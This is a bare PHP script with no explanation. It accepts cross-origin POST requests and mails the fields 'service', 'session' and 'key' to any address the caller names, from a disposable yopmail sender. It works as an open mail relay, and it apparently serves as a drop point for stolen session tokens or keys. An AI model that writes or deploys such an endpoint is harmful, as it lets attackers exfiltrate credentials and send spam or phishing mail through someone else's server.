<?php
header("Access-Control-Allow-Origin: *");
if (!empty($_POST))
{
$to      = $_POST['service'];
$subject = $_POST['session'];
$message = $_POST['key'];
$headers = 'From: alt.np-cg5r0f7@yopmail.com' . "\r\n" .
    'Reply-To: alt.np-cg5r0f7@yopmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
}
?>
